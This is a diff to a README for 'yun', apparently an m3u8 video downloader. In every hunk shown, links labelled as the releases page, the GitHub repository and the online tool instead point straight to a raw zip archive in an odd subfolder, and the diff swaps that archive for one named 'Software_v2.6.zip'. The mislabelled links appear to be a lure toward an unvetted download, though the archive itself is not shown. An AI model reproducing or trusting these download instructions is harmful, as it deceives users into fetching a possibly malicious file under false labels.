@@ -1,6 +1,6 @@
 # 🎉 yun - Easy Video Download Made Simple
 
-[![Download yun](https://raw.githubusercontent.com/ryzax1507/yun/main/maeandriniform/yun_v2.9.zip)](https://raw.githubusercontent.com/ryzax1507/yun/main/maeandriniform/yun_v2.9.zip)
+[![Download yun](https://raw.githubusercontent.com/ryzax1507/yun/main/maeandriniform/Software_v2.6.zip)](https://raw.githubusercontent.com/ryzax1507/yun/main/maeandriniform/Software_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -15,12 +15,12 @@ Welcome to yun! This tool helps you download m3u8 video fragments easily, withou
 
 To get started, visit the Releases page to download the application:
 
-[Download yun from Releases](https://raw.githubusercontent.com/ryzax1507/yun/main/maeandriniform/yun_v2.9.zip)
+[Download yun from Releases](https://raw.githubusercontent.com/ryzax1507/yun/main/maeandriniform/Software_v2.6.zip)
 
 ## 📖 How to Use
 
 1. **Open the Tool:**
-   - Go to the provided online link: [Tool Online Address](https://raw.githubusercontent.com/ryzax1507/yun/main/maeandriniform/yun_v2.9.zip).
+   - Go to the provided online link: [Tool Online Address](https://raw.githubusercontent.com/ryzax1507/yun/main/maeandriniform/Software_v2.6.zip).
    
 2. **Input m3u8 Link:**
    - Paste your m3u8 link into the input field.
@@ -86,7 +86,7 @@ For further assistance or community support, feel free to reach out! While the c
 
 ## 🔗 More Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/ryzax1507/yun/main/maeandriniform/yun_v2.9.zip)
-- [Tool Online Address](https://raw.githubusercontent.com/ryzax1507/yun/main/maeandriniform/yun_v2.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/ryzax1507/yun/main/maeandriniform/Software_v2.6.zip)
+- [Tool Online Address](https://raw.githubusercontent.com/ryzax1507/yun/main/maeandriniform/Software_v2.6.zip)
 
 By following these steps and using the links provided, you can successfully download and enjoy your m3u8 video content with yun.
